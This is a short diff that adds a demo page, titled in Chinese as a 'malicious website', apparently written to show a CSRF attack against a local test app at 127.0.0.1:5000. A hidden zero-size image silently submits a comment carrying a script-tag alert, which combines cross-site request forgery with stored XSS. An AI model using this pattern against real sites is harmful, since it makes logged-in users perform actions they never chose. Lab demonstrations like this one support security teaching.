@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>恶意网站</title>
+</head>
+<body>
+    <h1>这是一个恶意网站</h1>
+    <p>正在尝试发起CSRF攻击...</p>
+    <img src="http://127.0.0.1:5000/?content=<script>alert('CSRF攻击成功!')</script>恶意评论&submit=提交" width="0" height="0">
+    <p>如果已登录目标网站，攻击将自动执行。</p>
+</body>
+</html>
